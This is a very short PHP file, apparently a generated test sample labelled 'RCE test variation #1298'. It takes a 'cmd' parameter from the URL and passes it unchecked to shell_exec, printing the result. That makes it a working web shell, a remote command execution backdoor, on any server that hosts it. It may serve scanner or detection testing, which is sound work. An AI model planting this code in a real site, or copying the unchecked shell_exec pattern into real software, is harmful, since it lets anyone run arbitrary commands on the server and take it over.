<?php
// RCE test variation #1298
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>